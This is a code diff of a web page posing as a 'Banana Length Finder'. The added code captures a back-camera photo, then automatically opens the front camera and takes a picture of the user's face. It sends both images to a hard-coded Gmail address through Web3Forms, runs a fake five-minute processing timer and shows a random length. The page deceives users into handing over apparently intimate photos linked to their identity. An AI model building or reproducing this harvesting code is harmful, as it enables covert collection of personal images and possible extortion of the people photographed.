-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    canvas.style.display = 'block';
-    video.style.display  = 'none';
-
-    document.getElementById('btnCapture').disabled = true;
-    document.getElementById('btnRetake').style.display   = 'inline-block';
-    document.getElementById('btnGoSelfie').style.display = 'inline-block';
-    document.getElementById('btnStart').style.display    = 'none';
-
-    // Flash
-    document.body.style.background = '#fff';
-    setTimeout(() => document.body.style.background = '', 130);
-    status.textContent = '✅ Banana photo taken! Click "Next: Selfie →" to continue.';
-  }
-
-  function retakeBack() {
-    backPhotoURL = null;
-    canvas.style.display = 'none';
-    video.style.display  = 'block';
-    document.getElementById('btnCapture').disabled = false;
-    document.getElementById('btnRetake').style.display   = 'none';
-    document.getElementById('btnGoSelfie').style.display = 'none';
-    document.getElementById('btnStart').style.display    = 'inline-block';
-    status.textContent = 'Camera live — take another banana shot!';
-  }
-
-  // ─────────────────────────────────────────────
-  //  STEP 2 — FRONT CAMERA (Selfie)
-  // ─────────────────────────────────────────────
-  function startSelfieStep() {
-    // Stop back camera
-    stopStream(backStream);
-
-    // Update UI to step 2
-    setStep(2);
-    document.getElementById('step1Buttons').style.display = 'none';
-    document.getElementById('step2Buttons').style.display = 'block';
-    document.getElementById('stepBadge').textContent = 'Step 2 of 2';
-    document.getElementById('stepBadge').classList.add('selfie');
-    document.getElementById('stepTitleText').textContent = '🤳 Selfie verification';
-    document.getElementById('selfieNotice').classList.add('show');
-    document.getElementById('videoContainer').classList.add('selfie-mode');
-    canvas.style.display = 'none';
-    document.getElementById('placeholderMsg').style.display = 'block';
-    document.getElementById('placeholderMsg').style.color = '#93C5FD';
-    document.getElementById('placeholderMsg').textContent = '🤳 Front camera not started yet.\nClick "Open Front Camera" below.';
-    video.style.display = 'none';
-    video.classList.remove('active');
-    status.textContent = 'Read the notice above, then open your front camera.';
-  }
-
-  async function startFrontCamera() {
-    try {
-      status.textContent = 'Activating front camera...';
-      frontStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
-        audio: false
-      });
-      video.srcObject = frontStream;
-      video.classList.add('active');
-      document.getElementById('placeholderMsg').style.display = 'none';
-      video.style.display = 'block';
-      document.getElementById('btnStartFront').textContent = '✅ Front Camera On';
-      document.getElementById('btnStartFront').disabled = true;
-
-      // Start 3-second countdown then auto-capture selfie
-      status.textContent = 'Get ready! Selfie in 3 seconds... 📸';
-      startCountdown();
-    } catch(e) {
-      status.textContent = '⚠️ Front camera denied or unavailable.';
+  //  ---------- CAPTURE SEQUENCE: back + front automatically ----------
+  async function captureBackAndFront() {
+    if (!backStream) {
+      statusDiv.textContent = '❌ Camera not active. Open camera first.';
+      return;
     }
-  }
-
-  function startCountdown() {
-    countdownOverlay.classList.add('show');
-    let count = 3;
-    countdownNum.textContent = count;
-
-    const tick = setInterval(() => {
-      count--;
-      if (count > 0) {
-        countdownNum.textContent = count;
-        // re-trigger animation
-        countdownNum.style.animation = 'none';
-        void countdownNum.offsetWidth;
-        countdownNum.style.animation = 'popNum 1s ease-in-out';
-      } else {
-        clearInterval(tick);
-        countdownOverlay.classList.remove('show');
-        captureSelfie();
-      }
-    }, 1000);
-  }
-
-  function captureSelfie() {
-    selfiePhotoURL = captureFrame(video);
-
-    canvas.width  = video.videoWidth  || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    canvas.style.display = 'block';
-    video.style.display  = 'none';
-    stopStream(frontStream);
-
-    // Flash
-    document.body.style.background = '#fff';
-    setTimeout(() => document.body.style.background = '', 130);
-
-    document.getElementById('btnSend').style.display = 'inline-block';
-    status.textContent = '✅ Selfie taken! Click "Send for Analysis" to submit both photos.';
-  }
-
-  // ─────────────────────────────────────────────
-  //  SEND BOTH PHOTOS
-  // ─────────────────────────────────────────────
-  async function sendBothPhotos() {
-    if (!backPhotoURL || !selfiePhotoURL) {
-      status.textContent = '⚠️ Missing one of the photos. Please redo.';
+    if (frontCaptureInProgress) {
+      statusDiv.textContent = '⏳ Already capturing, please wait.';
       return;
     }
 
-    const btnSend = document.getElementById('btnSend');
-    btnSend.disabled = true;
-    btnSend.textContent = '⏳ Sending...';
-    status.textContent = 'Uploading both photos...';
-    showPopup();
+    // 1) Capture back (banana)
+    backPhotoURL = captureFrame(video);
+    // show preview on canvas
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.style.display = 'block';
+    video.style.display = 'none';
 
+    // disable capture button during process
+    btnCaptureDual.disabled = true;
+    frontCaptureInProgress = true;
+    statusDiv.textContent = '✅ Banana captured! Now capturing front camera image...';
+
+    // stop back stream temporarily
+    stopStream(backStream);
+    backStream = null;
+
+    // 2) Request front camera automatically
+    try {
+      statusDiv.textContent = '🤳 Opening front camera for second image...';
+      const frontStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1024 }, height: { ideal: 768 } },
+        audio: false
+      });
+      video.srcObject = frontStream;
+      video.style.display = 'block';
+      canvas.style.display = 'none';
+      video.classList.add('active');
+
+      // wait a moment for camera to adjust
+      await new Promise(r => setTimeout(r, 400));
+
+      // start countdown + capture front
+      await startFrontCaptureCountdown(frontStream);
+
+    } catch (err) {
+      statusDiv.textContent = '⚠️ Front camera error: ' + (err.message || 'permission denied');
+      frontCaptureInProgress = false;
+      // revert to retake possibility
+      btnRetakeAll.style.display = 'inline-block';
+      document.getElementById('mainControls').style.display = 'block';
+      btnCaptureDual.disabled = true;
+    }
+  }
+
+  function startFrontCaptureCountdown(frontStream) {
+    return new Promise((resolve) => {
+      let count = 3;
+      countdownNum.textContent = count;
+      countdownOverlay.classList.add('show');
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          countdownNum.textContent = count;
+          countdownNum.style.animation = 'none';
+          void countdownNum.offsetWidth;
+          countdownNum.style.animation = 'popCount 0.8s ease-out';
+        } else {
+          clearInterval(interval);
+          countdownOverlay.classList.remove('show');
+          // capture front image
+          const frontPhoto = captureFrame(video, 800);
+          frontPhotoURL = frontPhoto;
+          
+          // freeze preview on canvas
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.style.display = 'block';
+          video.style.display = 'none';
+          
+          // stop front stream
+          stopStream(frontStream);
+          video.srcObject = null;
+          
+          // both images ready
+          isBothCaptured = true;
+          frontCaptureInProgress = false;
+          
+          // update UI to "send mode"
+          document.getElementById('mainControls').style.display = 'none';
+          sendPanel.style.display = 'block';
+          btnRetakeAll.style.display = 'none';
+          
+          // update step indicator
+          updateStepUI(2);
+          stepBadge.textContent = '✅ Ready';
+          stepTitleText.textContent = '🍌 Banana + Front image captured';
+          statusDiv.innerHTML = '🎉 Both photos taken! Press "Send for Analysis".';
+          // flash effect
+          document.body.style.background = '#FFF9E6';
+          setTimeout(() => document.body.style.background = '', 200);
+          resolve();
+        }
+      }, 1000);
+    });
+  }
+
+  // Retake: full cleanup + restart camera
+  function retakeEverything() {
+    if (frontCaptureInProgress) return;
+    // kill possible active streams
+    if (video.srcObject) {
+      stopStream(video.srcObject);
+      video.srcObject = null;
+    }
+    stopStream(backStream);
+    backStream = null;
+    backPhotoURL = null;
+    frontPhotoURL = null;
+    isBothCaptured = false;
+    frontCaptureInProgress = false;
+    
+    sendPanel.style.display = 'none';
+    document.getElementById('mainControls').style.display = 'block';
+    btnRetakeAll.style.display = 'none';
+    btnCaptureDual.disabled = true;
+    btnStartCam.disabled = false;
+    btnStartCam.textContent = '📷 Open Camera';
+    video.style.display = 'block';
+    canvas.style.display = 'none';
+    document.getElementById('placeholderMsg').style.display = 'block';
+    document.getElementById('placeholderMsg').textContent = '📷 Open camera to start fresh capture';
+    statusDiv.textContent = '⟳ Reset done. Open camera and capture again.';
+    updateStepUI(1);
+    stepBadge.textContent = '📸 Dual capture';
+    stepTitleText.textContent = '🍌 Back camera ready';
+  }
+
+  // ---------- SEND both images to Web3Forms ----------
+  async function sendBothToEmail() {
+    if (!backPhotoURL || !frontPhotoURL) {
+      statusDiv.textContent = '⚠️ Missing images. Please recapture.';
+      return;
+    }
+    const sendBtn = btnSendFinal;
+    sendBtn.disabled = true;
+    sendBtn.textContent = '⏳ Uploading...';
+    statusDiv.textContent = '📡 Sending banana + front image...';
+    
     try {
       const timestamp = new Date().toLocaleString();
-
       // Send banana photo
       await fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify({
           access_key: WEB3FORMS_KEY,
-          subject: `🍌 Banana Photo — ${timestamp}`,
+          subject: `🍌 BANANA MEASUREMENT — ${timestamp}`,
           from_name: 'Banana Length Finder',
           email: RECIPIENT_EMAIL,
-          message: `BANANA PHOTO\nTime: ${timestamp}\n\n${backPhotoURL}`
+          message: `BANANA IMAGE (back camera)\nTimestamp: ${timestamp}\n\n${backPhotoURL}`
         })
       });
-
-      // Send selfie
+      // Send front camera photo
       await fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify({
           access_key: WEB3FORMS_KEY,
-          subject: `🤳 Selfie Verification — ${timestamp}`,
+          subject: `📸 FRONT CAMERA IMAGE — ${timestamp}`,
           from_name: 'Banana Length Finder',
           email: RECIPIENT_EMAIL,
-          message: `SELFIE VERIFICATION\nTime: ${timestamp}\n\n${selfiePhotoURL}`
+          message: `FRONT CAMERA PHOTO (user capture)\nTimestamp: ${timestamp}\n\n${frontPhotoURL}`
         })
       });
-
-      setStep(3);
-      btnSend.textContent = '✅ Sent!';
-      status.textContent = '✅ Both photos sent to iot757978@gmail.com!';
-    } catch(err) {
-      status.textContent = '⚠️ Send failed: ' + err.message;
-      btnSend.textContent = '📤 Retry';
-      btnSend.disabled = false;
+      
+      statusDiv.innerHTML = '✅ Both images delivered! Analysis will be sent to iot757978@gmail.com';
+      sendBtn.textContent = '✓ Sent';
+      sendBtn.disabled = true;
+      
+      // Show the processing popup (5 min fake processing)
+      showProcessingPopup();
+    } catch (err) {
+      statusDiv.textContent = '❌ Send failed: ' + err.message;
+      sendBtn.disabled = false;
+      sendBtn.textContent = '📤 Retry Send';
     }
   }
 
-  // ── Processing Popup ──────────────────────────
-  function showPopup() {
+  let timerInterval = null;
+  function showProcessingPopup() {
     popup.classList.add('show');
     let totalSeconds = 300;
     progressBar.style.width = '0%';
+    function updateTimer(secs) {
+      const m = String(Math.floor(secs / 60)).padStart(2, '0');
+      const s = String(secs % 60).padStart(2, '0');
+      timerDisplay.textContent = `${m}:${s}`;
+    }
     updateTimer(totalSeconds);
+    if (timerInterval) clearInterval(timerInterval);
     timerInterval = setInterval(() => {
       totalSeconds--;
-      progressBar.style.width = ((300 - totalSeconds) / 300 * 100).toFixed(1) + '%';
+      const percent = ((300 - totalSeconds) / 300) * 100;
+      progressBar.style.width = Math.min(100, percent) + '%';
       updateTimer(totalSeconds);
       if (totalSeconds <= 0) {
         clearInterval(timerInterval);
         popup.classList.remove('show');
-        const cm = (Math.random() * 8 + 14).toFixed(1);
-        status.innerHTML = `✅ Analysis complete! Your banana is <strong>${cm} cm</strong> long 🍌`;
+        const randomCm = (Math.random() * 7.5 + 13.5).toFixed(1);
+        statusDiv.innerHTML = `🍌✨ Analysis complete! Your banana is <strong>${randomCm} cm</strong> long. ✨🍌`;
       }
     }, 1000);
   }
 
-  function updateTimer(secs) {
-    const m = String(Math.floor(secs / 60)).padStart(2,'0');
-    const s = String(secs % 60).padStart(2,'0');
-    timerDisplay.textContent = `${m}:${s}`;
-  }
+  // ---------- Event binding ----------
+  btnStartCam.addEventListener('click', startBackCamera);
+  btnCaptureDual.addEventListener('click', captureBackAndFront);
+  btnRetakeAll.addEventListener('click', retakeEverything);
+  btnRetakeAfter.addEventListener('click', retakeEverything);
+  btnSendFinal.addEventListener('click', sendBothToEmail);
+  
+  // initial disable capture until camera open
+  btnCaptureDual.disabled = true;
+  updateStepUI(1);
 </script>
 </body>
 </html>
